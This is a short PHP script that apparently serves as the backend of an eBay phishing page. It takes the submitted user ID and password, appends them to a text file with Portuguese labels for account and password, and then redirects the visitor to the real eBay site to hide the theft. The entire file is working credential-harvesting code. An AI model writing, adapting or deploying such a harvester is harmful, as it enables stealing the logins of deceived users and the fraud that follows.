<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['userid'] . " Senha: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://ebay.com');
exit();
